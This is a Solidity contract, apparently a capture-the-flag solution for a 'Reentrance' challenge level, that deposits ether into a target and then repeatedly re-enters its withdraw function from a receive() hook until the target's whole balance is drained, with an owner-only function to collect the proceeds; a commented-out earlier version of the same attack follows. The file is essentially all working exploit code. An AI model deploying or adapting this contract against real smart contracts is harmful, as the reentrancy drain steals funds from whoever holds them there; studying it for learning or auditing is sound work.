// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;

    receive() external payable;
}

contract Level10Solution is Ownable {
    IReentrance public challenge;
    uint256 initialDeposit;

    constructor(address challengeAddress) {
        challenge = IReentrance(payable(challengeAddress));
    }

    function attack() external payable {
        // require(msg.value >= 0.1 ether, "send some more ether");

        // first deposit some funds
        initialDeposit = msg.value;
        challenge.donate{value: initialDeposit, gas: 40 gwei}(address(this));

        // withdraw these funds over and over again because of re-entrancy issue
        callWithdraw();
    }

    receive() external payable {
        // re-entrance called by challenge
        callWithdraw();
    }

    function callWithdraw() private {
        // this balance correctly updates after withdraw
        uint256 challengeTotalRemainingBalance = address(challenge).balance;
        // are there more tokens to empty?
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw = initialDeposit < challengeTotalRemainingBalance
                ? initialDeposit
                : challengeTotalRemainingBalance;
            console.log("remaing: ", challengeTotalRemainingBalance);
            console.log("toWithdraw: ", toWithdraw);
            challenge.withdraw(toWithdraw);
        }
    }

    // address payable reentranceAddress;
    // uint256 initialDeposit;
    // IReentrance private target;

    // constructor(address payable _address) {
    //     reentranceAddress = _address;
    //     target = IReentrance(reentranceAddress);
    // }

    // function attack() public payable onlyOwner {
    //     initialDeposit = msg.value;
    //     target.donate{value: initialDeposit, gas: 40 gwei}(address(this));
    //     repeater();
    // }

    // function repeater() private {
    //     uint256 remainingBalance = reentranceAddress.balance;
    //     uint256 ourBalance = target.balanceOf(address(this));

    //     if (remainingBalance >= ourBalance) {
    //         target.withdraw(ourBalance);
    //     } else if (remainingBalance > 0) {
    //         target.withdraw(remainingBalance);
    //     }
    // }

    // receive() external payable {
    //     repeater();
    // }

    function withdraw() external onlyOwner {
        uint256 amount = address(this).balance;
        (bool sent, ) = payable(owner()).call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
